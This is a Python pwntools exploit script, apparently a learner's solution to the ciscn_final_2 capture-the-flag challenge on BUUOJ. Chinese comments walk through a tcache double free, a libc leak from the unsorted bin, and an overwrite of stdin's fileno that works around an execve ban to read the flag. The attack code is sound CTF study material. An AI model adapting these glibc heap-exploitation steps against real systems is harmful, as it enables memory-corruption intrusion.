#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29890
elfpath = './ciscn_final_2_patched'
ldpath = './ld-2.27.so'
libcpath = './libc-2.27.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))


def command(c):
    ru(b'which command?\n> ')
    sl(str(c).encode())


def add(number, type = 1):
    command(1)
    ru(b'TYPE:\n1: int\n2: short int\n>')
    sl(str(type).encode())
    ru(b'your inode number')
    sl(str(number).encode())

# def edit(index, size, content):


def free(type = 1):
    command(2)
    ru(b'TYPE:\n1: int\n2: short int\n>')
    sl(str(type).encode())

def show(type=1):
    command(3)
    ru(b'TYPE:\n1: int\n2: short int\n>')
    sl(str(type).encode())
    if type == 1:
        ru(b'your int type inode number :')
    else:
        ru(b'your short type inode number :')
    return ru(b'\n', drop=True)


# start pwning
'''
ubunt18, glibc 2.27
程序中调用了:
prctl(38, 1LL, 0LL, 0LL, 0LL)
限制了execve的系统调用，所以system和one_gadget都用不了
prctl(22, 2LL, &v1)

漏洞点：
free之后没有置0

知识盲点了，学习一下
后续回顾建议跟着调试一遍
'''

add(0x30, 1)
free(1)
for i in range(4):
    add(0x20, 2)
free(2)

add(0x30, 1)
free(2) # 造成tcache bin的double free，从而可以任意写
int_chunk_addr = int(show(2)) - 0xa0
add(int_chunk_addr, 2) # 将tcache中的chunk的next改为int_chunk_addr
add(int_chunk_addr, 2)
add(0x91, 2) # 这里就会在第一个chunk中写入0x91 0x91，造成堆块重叠

for i in range(7):
    free(1) # 将修改后的0x90大小的chunk送入对应的tcache bin中，循环7次填满tcache bin的最大次数
    add(0x20, 2) # 堆布局
free(1) # 此时tcache满了，所以放入unsorted bin中，后面就可以通过这个chunk来泄露libc地址

main_arena = int(show(1)) - 96 # 调试得到
libc = ELF(libcpath)
libc_base = main_arena - 0x10 - libc.sym['__malloc_hook']
leak("libcbase", libc_base)
stdin_fileno = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70

'''
=================== 为什么是0x70的偏移，调试一下就知道了，_flags是int类型，后年一直到_chain都是
=================== 指针，所以对齐一下就是，14*8 = 0x70
pwndbg> p _IO_2_1_stdin_
$1 = {
  file = {
    _flags = -72539512,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7f16978c38d0 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7f16978c1ae0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f16978be2a0 <__GI__IO_file_jumps>
}
pwndbg> x/40gx &_IO_2_1_stdin_
0x7f16978c1a00 <_IO_2_1_stdin_>:        0x00000000fbad2288      0x0000000000000000
0x7f16978c1a10 <_IO_2_1_stdin_+16>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a20 <_IO_2_1_stdin_+32>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a30 <_IO_2_1_stdin_+48>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a40 <_IO_2_1_stdin_+64>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a50 <_IO_2_1_stdin_+80>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a60 <_IO_2_1_stdin_+96>:     0x0000000000000000      0x0000000000000000
0x7f16978c1a70 <_IO_2_1_stdin_+112>:    0x0000000000000000      0xffffffffffffffff
0x7f16978c1a80 <_IO_2_1_stdin_+128>:    0x0000000000000000      0x00007f16978c38d0
0x7f16978c1a90 <_IO_2_1_stdin_+144>:    0xffffffffffffffff      0x0000000000000000
0x7f16978c1aa0 <_IO_2_1_stdin_+160>:    0x00007f16978c1ae0      0x0000000000000000
0x7f16978c1ab0 <_IO_2_1_stdin_+176>:    0x0000000000000000      0x0000000000000000
0x7f16978c1ac0 <_IO_2_1_stdin_+192>:    0x0000000000000000      0x0000000000000000
0x7f16978c1ad0 <_IO_2_1_stdin_+208>:    0x0000000000000000      0x00007f16978be2a0
0x7f16978c1ae0 <_IO_wide_data_0>:       0x0000000000000000      0x0000000000000000
0x7f16978c1af0 <_IO_wide_data_0+16>:    0x0000000000000000      0x0000000000000000
0x7f16978c1b00 <_IO_wide_data_0+32>:    0x0000000000000000      0x0000000000000000
0x7f16978c1b10 <_IO_wide_data_0+48>:    0x0000000000000000      0x0000000000000000
0x7f16978c1b20 <_IO_wide_data_0+64>:    0x0000000000000000      0x0000000000000000
0x7f16978c1b30 <_IO_wide_data_0+80>:    0x0000000000000000      0x0000000000000000
'''

if args.LOCAL:
    gdb.attach(p)
# 改写第一个chunk中的内容为stdin_fileno地址
add(stdin_fileno, 1) # type1 对应的是 mallo(0x20)操作， 会从unsorted bin的chunk中切分，unsorted bin中的chunk还剩下0x60大小
add(0x30, 1) # 同样切分，unsorted bin中chunk还剩下0x30大小
free(1) # 送一个0x30大小的chunk进入到对应的tcache bin中。
add(0x20, 2) # 这里对应的是malloc(0x10)操作，ptmalloc的管理机制实际上会直接将unsorted bin中剩下的0x30大小的chunk分配出去。
free(1) # 造成tcache[0x30]的double free
addr_chunk0_fd = int(show(1)) - 0x30
add(addr_chunk0_fd, 1) # 修改tcache中头部chunk的next指针为第一个chunk
add(addr_chunk0_fd, 1) # 此时tcache的头部chunk为第一个chunk
add(111, 1) # 此时tcache的头部chunk为stdin_fileno
add(666, 1) # 分配chunk到stdin_fileno，改写fileno为666
command(4) # 读取flag内容
shell()

# 难哭了😭
# 本地调试看懂花了至少3小时
# 这tm要是比赛那就不知道g到哪儿去了...